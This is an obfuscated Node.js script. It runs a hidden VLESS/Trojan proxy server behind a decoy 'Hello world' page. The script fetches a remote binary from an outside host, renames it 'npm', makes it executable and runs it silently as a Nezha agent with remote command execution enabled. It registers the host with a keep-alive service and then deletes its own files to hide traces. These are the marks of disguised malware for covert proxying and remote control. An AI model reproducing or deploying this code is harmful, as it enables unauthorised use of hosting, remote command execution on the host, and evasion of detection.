const _0x2e662f=_0x5580;(function(_0x196b95,_0x5a425a){const _0x4938b5=_0x5580,_0x200079=_0x196b95();while(!![]){try{const _0x31a42f=-parseInt(_0x4938b5(0x108))/0x1*(-parseInt(_0x4938b5(0xf8))/0x2)+-parseInt(_0x4938b5(0x113))/0x3+parseInt(_0x4938b5(0x10e))/0x4*(parseInt(_0x4938b5(0x107))/0x5)+parseInt(_0x4938b5(0x109))/0x6*(-parseInt(_0x4938b5(0xfe))/0x7)+-parseInt(_0x4938b5(0x13a))/0x8+-parseInt(_0x4938b5(0xf0))/0x9*(parseInt(_0x4938b5(0x104))/0xa)+parseInt(_0x4938b5(0x102))/0xb;if(_0x31a42f===_0x5a425a)break;else _0x200079['push'](_0x200079['shift']());}catch(_0x316b1d){_0x200079['push'](_0x200079['shift']());}}}(_0x1205,0xe73f6));const os=require('os'),http=require(_0x2e662f(0x14d)),fs=require('fs'),axios=require(_0x2e662f(0xf9)),net=require('net'),path=require(_0x2e662f(0x140)),crypto=require(_0x2e662f(0x137)),{Buffer}=require(_0x2e662f(0x12e)),{exec,execSync}=require(_0x2e662f(0x126)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process.env.UUID||_0x2e662f(0x117),NEZHA_SERVER=process.env.NEZHA_SERVER||'',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',DOMAIN=process.env.DOMAIN||_0x2e662f(0x11d),AUTO_ACCESS=process.env.AUTO_ACCESS||!![],WSPATH=process.env.WSPATH||UUID[_0x2e662f(0x149)](0x0,0x8),SUB_PATH=process.env.SUB_PATH||_0x2e662f(0xdf),NAME=process.env.NAME||'',PORT=process.env.PORT||0x1eb4;let ISP='';const GetISP=async()=>{const _0x566f4e=_0x2e662f;try{const _0x1566f6=await axios[_0x566f4e(0x135)]('https://api.ip.sb/geoip'),_0x4da4ab=_0x1566f6[_0x566f4e(0xf6)];ISP=(_0x4da4ab[_0x566f4e(0xf7)]+'-'+_0x4da4ab[_0x566f4e(0x128)])[_0x566f4e(0xe9)](/ /g,'_');}catch(_0xe532d4){ISP=_0x566f4e(0x136);}};GetISP();const httpServer=http['createServer']((_0x11879f,_0x5e291c)=>{const _0x195668=_0x2e662f;if(_0x11879f[_0x195668(0x146)]==='/'){const _0x277ce7=path[_0x195668(0xfd)](__dirname,'index.html');fs[_0x195668(0xed)](_0x277ce7,_0x195668(0xfa),(_0x122131,_0x519c6f)=>{const _0x42a431=_0x195668;if(_0x122131){_0x5e291c[_0x42a431(0x13f)](0xc8,{'Content-Type':'text/html'}),_0x5e291c[_0x42a431(0xe6)]('Hello\x20world!');return;}_0x5e291c[_0x42a431(0x13f)](0xc8,{'Content-Type':_0x42a431(0x10b)}),_0x5e291c[_0x42a431(0xe6)](_0x519c6f);});return;}else{if(_0x11879f[_0x195668(0x146)]==='/'+SUB_PATH){const _0xfdb241=NAME?NAME+'-'+ISP:ISP,_0x239c8f=_0x195668(0x129)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x195668(0x114)+DOMAIN+_0x195668(0x13e)+WSPATH+'#'+_0xfdb241,_0x280ffe=_0x195668(0x13c)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x195668(0x114)+DOMAIN+_0x195668(0x13e)+WSPATH+'#'+_0xfdb241,_0x3f9eec=_0x239c8f+'\x0a'+_0x280ffe,_0x42255d=Buffer[_0x195668(0xef)](_0x3f9eec)[_0x195668(0xe0)](_0x195668(0xe7));_0x5e291c[_0x195668(0x13f)](0xc8,{'Content-Type':'text/plain'}),_0x5e291c[_0x195668(0xe6)](_0x42255d+'\x0a');}else _0x5e291c[_0x195668(0x13f)](0x194,{'Content-Type':'text/plain'}),_0x5e291c[_0x195668(0xe6)](_0x195668(0x130));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x2e662f(0xe9)](/-/g,''),DNS_SERVERS=[_0x2e662f(0x120),_0x2e662f(0x142)];function resolveHost(_0x21c2e1){return new Promise((_0x3db877,_0x1feedf)=>{const _0x4f4a24=_0x5580;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4f4a24(0xff)](_0x21c2e1)){_0x3db877(_0x21c2e1);return;}let _0x24550f=0x0;function _0x34345f(){const _0x51d8d7=_0x4f4a24;if(_0x24550f>=DNS_SERVERS[_0x51d8d7(0x115)]){_0x1feedf(new Error(_0x51d8d7(0x14f)+_0x21c2e1+_0x51d8d7(0x151)));return;}const _0x4a626d=DNS_SERVERS[_0x24550f];_0x24550f++;const _0x717db3='https://dns.google/resolve?name='+encodeURIComponent(_0x21c2e1)+_0x51d8d7(0xee);axios[_0x51d8d7(0x135)](_0x717db3,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x35fea7=>{const _0x4e68f2=_0x51d8d7,_0x3077f7=_0x35fea7[_0x4e68f2(0xf6)];if(_0x3077f7[_0x4e68f2(0x110)]===0x0&&_0x3077f7[_0x4e68f2(0x12c)]&&_0x3077f7[_0x4e68f2(0x12c)]['length']>0x0){const _0x37b36c=_0x3077f7[_0x4e68f2(0x12c)][_0x4e68f2(0xea)](_0x12b154=>_0x12b154[_0x4e68f2(0xe8)]===0x1);if(_0x37b36c){_0x3db877(_0x37b36c[_0x4e68f2(0xf6)]);return;}}_0x34345f();})[_0x51d8d7(0xec)](_0x20562f=>{_0x34345f();});}_0x34345f();});}function handleVlessConnection(_0x52dbdd,_0x49eb3e){const _0x2daf4e=_0x2e662f,[_0x1b3f18]=_0x49eb3e,_0x4e8e26=_0x49eb3e['slice'](0x1,0x11);if(!_0x4e8e26[_0x2daf4e(0x14a)]((_0x405471,_0x5a6870)=>_0x405471==parseInt(uuid['substr'](_0x5a6870*0x2,0x2),0x10)))return![];let _0x5b9b5f=_0x49eb3e['slice'](0x11,0x12)[_0x2daf4e(0x13b)]()+0x13;const _0x30576b=_0x49eb3e[_0x2daf4e(0x149)](_0x5b9b5f,_0x5b9b5f+=0x2)[_0x2daf4e(0x101)](0x0),_0x5b8b87=_0x49eb3e[_0x2daf4e(0x149)](_0x5b9b5f,_0x5b9b5f+=0x1)[_0x2daf4e(0x13b)](),_0x551887=_0x5b8b87==0x1?_0x49eb3e['slice'](_0x5b9b5f,_0x5b9b5f+=0x4)['join']('.'):_0x5b8b87==0x2?new TextDecoder()['decode'](_0x49eb3e[_0x2daf4e(0x149)](_0x5b9b5f+0x1,_0x5b9b5f+=0x1+_0x49eb3e[_0x2daf4e(0x149)](_0x5b9b5f,_0x5b9b5f+0x1)[_0x2daf4e(0x13b)]())):_0x5b8b87==0x3?_0x49eb3e[_0x2daf4e(0x149)](_0x5b9b5f,_0x5b9b5f+=0x10)[_0x2daf4e(0x119)]((_0x26b86b,_0x4ce8d3,_0x11443b,_0x43f29d)=>_0x11443b%0x2?_0x26b86b[_0x2daf4e(0xf5)](_0x43f29d[_0x2daf4e(0x149)](_0x11443b-0x1,_0x11443b+0x1)):_0x26b86b,[])['map'](_0x1697c3=>_0x1697c3[_0x2daf4e(0x101)](0x0)[_0x2daf4e(0xe0)](0x10))[_0x2daf4e(0xfd)](':'):'';_0x52dbdd[_0x2daf4e(0x111)](new Uint8Array([_0x1b3f18,0x0]));const _0x1a480f=createWebSocketStream(_0x52dbdd);return resolveHost(_0x551887)[_0x2daf4e(0xe5)](_0x2e83aa=>{const _0x5c0564=_0x2daf4e;net['connect']({'host':_0x2e83aa,'port':_0x30576b},function(){const _0x5ee165=_0x5580;this[_0x5ee165(0x121)](_0x49eb3e['slice'](_0x5b9b5f)),_0x1a480f['on'](_0x5ee165(0x12b),()=>{})[_0x5ee165(0x11b)](this)['on'](_0x5ee165(0x12b),()=>{})[_0x5ee165(0x11b)](_0x1a480f);})['on'](_0x5c0564(0x12b),()=>{});})[_0x2daf4e(0xec)](_0x49b800=>{const _0x57bdb4=_0x2daf4e;net['connect']({'host':_0x551887,'port':_0x30576b},function(){const _0x3d4505=_0x5580;this[_0x3d4505(0x121)](_0x49eb3e[_0x3d4505(0x149)](_0x5b9b5f)),_0x1a480f['on'](_0x3d4505(0x12b),()=>{})[_0x3d4505(0x11b)](this)['on'](_0x3d4505(0x12b),()=>{})[_0x3d4505(0x11b)](_0x1a480f);})['on'](_0x57bdb4(0x12b),()=>{});}),!![];}function _0x1205(){const _0x5ebe45=['isp','vless://','log','error','Answer','setsid\x20nohup\x20./npm\x20-s\x20','buffer','https://oooo.serv00.net/add-url','Not\x20Found\x0a','https://amd64.ssss.nyc.mn/v1','error:\x20','npm\x20is\x20running','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','get','Unknown','crypto','client_secret:\x20','digest','4683888SwtMbb','readUInt8','trojan://','createHash','&path=%2F','writeHead','path','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','1.1.1.1','true','arm','once','url','writeFileSync','close','slice','every','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','pop','http','https://arm64.ssss.nyc.mn/agent','Failed\x20to\x20resolve\x20','aarch64','\x20with\x20all\x20DNS\x20servers','arch','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','sub','toString','substr','trim','https://arm64.ssss.nyc.mn/v1','Automatic\x20Access\x20Task\x20added\x20successfully','then','end','base64','type','replace','find','createWriteStream','catch','readFile','&type=A','from','3788919PzbkvQ','npm','--tls','finish','application/json','concat','data','country_code','3735296zKajGm','axios','utf8','https://amd64.ssss.nyc.mn/agent','sha224','join','9495514utZFZK','test','includes','readUInt16BE','21774082IYhpqn','\x20-p\x20','30vzUpLW','config.yaml','unlink','7178045BqPhCI','1MwYSvM','6yFeooZ','arm64','text/html','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','npm\x20is\x20already\x20running,\x20skip\x20running...','4WmTzrq','2087','Status','send','Server\x20is\x20running\x20on\x20port\x20','3391704nwKWbq','&fp=chrome&type=ws&host=','length','443','d17604a6-358c-4495-8f80-fe1eb9a2df57','post','reduce','chmod\x20+x\x20npm','pipe','connect','1234.abc.com','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','utf-8','8.8.4.4','write','false','stream','message','2053','child_process','listen'];_0x1205=function(){return _0x5ebe45;};return _0x1205();}function handleTrojanConnection(_0x5ba9ac,_0x8d43f9){const _0x58289e=_0x2e662f;try{if(_0x8d43f9[_0x58289e(0x115)]<0x3a)return![];const _0x5a8570=_0x8d43f9['slice'](0x0,0x38)['toString'](),_0xa5c1dd=[UUID];let _0x1d9c44=null;for(const _0x3724e4 of _0xa5c1dd){const _0x314530=crypto[_0x58289e(0x13d)](_0x58289e(0xfc))['update'](_0x3724e4)[_0x58289e(0x139)]('hex');if(_0x314530===_0x5a8570){_0x1d9c44=_0x3724e4;break;}}if(!_0x1d9c44)return![];let _0x2a43e3=0x38;_0x8d43f9[_0x2a43e3]===0xd&&_0x8d43f9[_0x2a43e3+0x1]===0xa&&(_0x2a43e3+=0x2);const _0x2aaddc=_0x8d43f9[_0x2a43e3];if(_0x2aaddc!==0x1)return![];_0x2a43e3+=0x1;const _0x51f33d=_0x8d43f9[_0x2a43e3];_0x2a43e3+=0x1;let _0x1f53dc,_0x501d4f;if(_0x51f33d===0x1)_0x1f53dc=_0x8d43f9['slice'](_0x2a43e3,_0x2a43e3+0x4)['join']('.'),_0x2a43e3+=0x4;else{if(_0x51f33d===0x3){const _0x3dc916=_0x8d43f9[_0x2a43e3];_0x2a43e3+=0x1,_0x1f53dc=_0x8d43f9[_0x58289e(0x149)](_0x2a43e3,_0x2a43e3+_0x3dc916)['toString'](),_0x2a43e3+=_0x3dc916;}else{if(_0x51f33d===0x4)_0x1f53dc=_0x8d43f9['slice'](_0x2a43e3,_0x2a43e3+0x10)[_0x58289e(0x119)]((_0x203ca0,_0x3fe96e,_0x36412d,_0x47ccc7)=>_0x36412d%0x2?_0x203ca0[_0x58289e(0xf5)](_0x47ccc7[_0x58289e(0x149)](_0x36412d-0x1,_0x36412d+0x1)):_0x203ca0,[])['map'](_0x481b80=>_0x481b80[_0x58289e(0x101)](0x0)[_0x58289e(0xe0)](0x10))[_0x58289e(0xfd)](':'),_0x2a43e3+=0x10;else return![];}}_0x501d4f=_0x8d43f9['readUInt16BE'](_0x2a43e3),_0x2a43e3+=0x2;_0x2a43e3<_0x8d43f9[_0x58289e(0x115)]&&_0x8d43f9[_0x2a43e3]===0xd&&_0x8d43f9[_0x2a43e3+0x1]===0xa&&(_0x2a43e3+=0x2);const _0x46838f=createWebSocketStream(_0x5ba9ac);return resolveHost(_0x1f53dc)['then'](_0x5b77f4=>{const _0x3950b8=_0x58289e;net[_0x3950b8(0x11c)]({'host':_0x5b77f4,'port':_0x501d4f},function(){const _0x461b3d=_0x3950b8;_0x2a43e3<_0x8d43f9[_0x461b3d(0x115)]&&this[_0x461b3d(0x121)](_0x8d43f9[_0x461b3d(0x149)](_0x2a43e3)),_0x46838f['on'](_0x461b3d(0x12b),()=>{})['pipe'](this)['on'](_0x461b3d(0x12b),()=>{})[_0x461b3d(0x11b)](_0x46838f);})['on'](_0x3950b8(0x12b),()=>{});})[_0x58289e(0xec)](_0x33da9b=>{const _0x41db0b=_0x58289e;net[_0x41db0b(0x11c)]({'host':_0x1f53dc,'port':_0x501d4f},function(){const _0x4d55a6=_0x41db0b;_0x2a43e3<_0x8d43f9[_0x4d55a6(0x115)]&&this[_0x4d55a6(0x121)](_0x8d43f9[_0x4d55a6(0x149)](_0x2a43e3)),_0x46838f['on'](_0x4d55a6(0x12b),()=>{})[_0x4d55a6(0x11b)](this)['on'](_0x4d55a6(0x12b),()=>{})[_0x4d55a6(0x11b)](_0x46838f);})['on'](_0x41db0b(0x12b),()=>{});}),!![];}catch(_0x3fdd8a){return![];}}function _0x5580(_0x436db1,_0x17f80b){_0x436db1=_0x436db1-0xdd;const _0x1205ba=_0x1205();let _0x558061=_0x1205ba[_0x436db1];return _0x558061;}wss['on']('connection',(_0x5d96d6,_0x43c6ac)=>{const _0x4c1c27=_0x2e662f,_0x47f830=_0x43c6ac[_0x4c1c27(0x146)]||'';_0x5d96d6[_0x4c1c27(0x145)](_0x4c1c27(0x124),_0x42c6a6=>{const _0x3b791c=_0x4c1c27;if(_0x42c6a6[_0x3b791c(0x115)]>0x11&&_0x42c6a6[0x0]===0x0){const _0x51e200=_0x42c6a6[_0x3b791c(0x149)](0x1,0x11),_0x4b0f58=_0x51e200[_0x3b791c(0x14a)]((_0x6071f1,_0x8cc2e1)=>_0x6071f1==parseInt(uuid[_0x3b791c(0xe1)](_0x8cc2e1*0x2,0x2),0x10));if(_0x4b0f58){!handleVlessConnection(_0x5d96d6,_0x42c6a6)&&_0x5d96d6[_0x3b791c(0x148)]();return;}}!handleTrojanConnection(_0x5d96d6,_0x42c6a6)&&_0x5d96d6[_0x3b791c(0x148)]();})['on'](_0x4c1c27(0x12b),()=>{});});const getDownloadUrl=()=>{const _0x5e846a=_0x2e662f,_0x1fdfe5=os[_0x5e846a(0xdd)]();return _0x1fdfe5===_0x5e846a(0x144)||_0x1fdfe5===_0x5e846a(0x10a)||_0x1fdfe5===_0x5e846a(0x150)?!NEZHA_PORT?_0x5e846a(0xe3):_0x5e846a(0x14e):!NEZHA_PORT?_0x5e846a(0x131):_0x5e846a(0xfb);},downloadFile=async()=>{const _0xb68e88=_0x2e662f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x597f0e=getDownloadUrl(),_0x489a6a=await axios({'method':_0xb68e88(0x135),'url':_0x597f0e,'responseType':_0xb68e88(0x123)}),_0x5c9dd4=fs[_0xb68e88(0xeb)](_0xb68e88(0xf1));return _0x489a6a[_0xb68e88(0xf6)][_0xb68e88(0x11b)](_0x5c9dd4),new Promise((_0x1bcb22,_0x1917cf)=>{const _0x3c8638=_0xb68e88;_0x5c9dd4['on'](_0x3c8638(0xf3),()=>{const _0x5ef45a=_0x3c8638;console[_0x5ef45a(0x12a)]('npm\x20download\x20successfully'),exec(_0x5ef45a(0x11a),_0x4633e4=>{if(_0x4633e4)_0x1917cf(_0x4633e4);_0x1bcb22();});}),_0x5c9dd4['on']('error',_0x1917cf);});}catch(_0x12f169){throw _0x12f169;}},runnz=async()=>{const _0x2dd39b=_0x2e662f;try{const _0x3a9459=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x2dd39b(0x11f)});if(_0x3a9459[_0x2dd39b(0xe2)]()!==''){console[_0x2dd39b(0x12a)](_0x2dd39b(0x10d));return;}}catch(_0x2e9fad){}await downloadFile();let _0x3dcbf9='',_0x5c12d4=[_0x2dd39b(0x116),'8443','2096',_0x2dd39b(0x10f),'2083',_0x2dd39b(0x125)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4d3590=_0x5c12d4[_0x2dd39b(0x100)](NEZHA_PORT)?_0x2dd39b(0xf2):'';_0x3dcbf9=_0x2dd39b(0x12d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2dd39b(0x103)+NEZHA_KEY+'\x20'+_0x4d3590+_0x2dd39b(0x134);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x52b098=NEZHA_SERVER[_0x2dd39b(0x100)](':')?NEZHA_SERVER['split'](':')[_0x2dd39b(0x14c)]():'',_0x489f54=_0x5c12d4['includes'](_0x52b098)?_0x2dd39b(0x143):_0x2dd39b(0x122),_0x422e69=_0x2dd39b(0x138)+NEZHA_KEY+_0x2dd39b(0xde)+NEZHA_SERVER+_0x2dd39b(0x10c)+_0x489f54+_0x2dd39b(0x141)+UUID;fs[_0x2dd39b(0x147)]('config.yaml',_0x422e69);}_0x3dcbf9=_0x2dd39b(0x11e);}else{console[_0x2dd39b(0x12a)](_0x2dd39b(0x14b));return;}}try{exec(_0x3dcbf9,{'shell':'/bin/bash'},_0x5b1295=>{const _0x47e506=_0x2dd39b;if(_0x5b1295)console[_0x47e506(0x12b)]('npm\x20running\x20error:',_0x5b1295);else console[_0x47e506(0x12a)](_0x47e506(0x133));});}catch(_0x6ca266){console[_0x2dd39b(0x12b)](_0x2dd39b(0x132)+_0x6ca266);}};async function addAccessTask(){const _0x2b0f90=_0x2e662f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3ab8dd='https://'+DOMAIN;try{const _0x1bca5e=await axios[_0x2b0f90(0x118)](_0x2b0f90(0x12f),{'url':_0x3ab8dd},{'headers':{'Content-Type':_0x2b0f90(0xf4)}});console['log'](_0x2b0f90(0xe4));}catch(_0xa48e0e){}}const delFiles=()=>{const _0x4427a5=_0x2e662f;fs['unlink'](_0x4427a5(0xf1),()=>{}),fs[_0x4427a5(0x106)](_0x4427a5(0x105),()=>{});};httpServer[_0x2e662f(0x127)](PORT,()=>{const _0x556a13=_0x2e662f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x556a13(0x112)+PORT);});
